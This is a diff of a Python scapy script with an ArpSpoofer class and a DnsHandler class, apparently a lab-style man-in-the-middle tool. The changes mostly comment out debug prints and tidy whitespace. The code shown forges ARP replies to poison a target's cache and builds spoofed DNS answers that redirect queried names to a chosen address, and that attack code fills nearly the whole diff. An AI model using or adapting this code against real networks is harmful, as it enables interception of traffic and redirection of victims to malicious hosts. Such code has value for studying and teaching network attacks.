@@ -51,10 +51,10 @@ class ArpSpoofer(object):
         """
         if self.target_mac is None:
             # send ARP request to target_ip
-            ARP_request = ARP(pdst=self.target_ip)
-            print("waiting for arp response for target MAC")
-            response = sr1(ARP_request, iface=IFACE)
-            self.target_mac = response.hwsrc
+            # ARP_request = ARP(pdst=self.target_ip)
+            # print("waiting for arp response for target MAC")
+            # response = sr1(ARP_request, iface=IFACE)
+            # self.target_mac = response.hwsrc
             self.target_mac = getmacbyip(self.target_ip)
         return self.target_mac
 
@@ -69,8 +69,8 @@ class ArpSpoofer(object):
 
         arp_response = ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.spoof_ip)
         scapy.send(arp_response, iface=IFACE, verbose=0)
-        print(f"Sending spoof number {self.spoof_count}")
-        self.spoof_count += 1
+        # print(f"Sending spoof number {self.spoof_count}")
+        # self.spoof_count += 1
 
     def run(self) -> None:
         """
@@ -113,6 +113,7 @@ class DnsHandler(object):
         self.spoof_dict = spoof_dict
         self.real_dns_server_ip = REAL_DNS_SERVER_IP
 
+
     def get_real_dns_response(self, pkt: scapy.packet.Packet) -> scapy.packet.Packet:
         """
         Returns the real DNS response to the given DNS request.
@@ -133,6 +134,7 @@ class DnsHandler(object):
         dns_query = IP(dst=REAL_DNS_SERVER_IP) / UDP(dport=53) / DNS(rd=1,
                                                                      id=transaction_id,
                                                                      qd=qd)
+
 
         # TODO: fix this, nothing is returned
         # Send the DNS query to 8.8.8.8 and wait for the response
@@ -156,6 +158,7 @@ class DnsHandler(object):
 
         return dns_response
 
+
     def get_spoofed_dns_response(self, pkt: scapy.packet.Packet, to: str) -> scapy.packet.Packet:
         """
         Returns a fake DNS response to the given DNS request.
@@ -172,22 +175,13 @@ class DnsHandler(object):
         transaction_id = pkt[DNS].id  # Transaction ID
         query_name = pkt[DNS].qd.qname  # Query name
 
-        # print everything we got
-        print("ip_src:", ip_src)
-        print("ip_dst:", ip_dst)
-        print("port_src:", port_src)
-        print("port_dst:", port_dst)
-        print("transaction_id:", transaction_id)
-        print("query_name:", query_name)
-        print("to:", to)
 
         response_pkt = IP(src=ip_src, dst=ip_dst) / \
                        UDP(sport=port_src, dport=port_dst) / \
                        DNS(id=transaction_id, qr=1, aa=1, qd=pkt[DNS].qd,
                            an=DNSRR(rrname=query_name, ttl=300, rdata=to))
-        print(response_pkt)
-        print(response_pkt.show())
         return response_pkt
+
 
     def resolve_packet(self, pkt: scapy.packet.Packet) -> str:
         """
@@ -220,6 +214,7 @@ class DnsHandler(object):
             response_pkt.show()
             scapy.send(response_pkt)
 
+
     def run(self) -> None:
         """
         Main loop of the process. Sniffs for packets on the interface and sends DNS
@@ -232,6 +227,7 @@ class DnsHandler(object):
             except:
                 import traceback
                 traceback.print_exc()
+
 
     def start(self) -> None:
         """
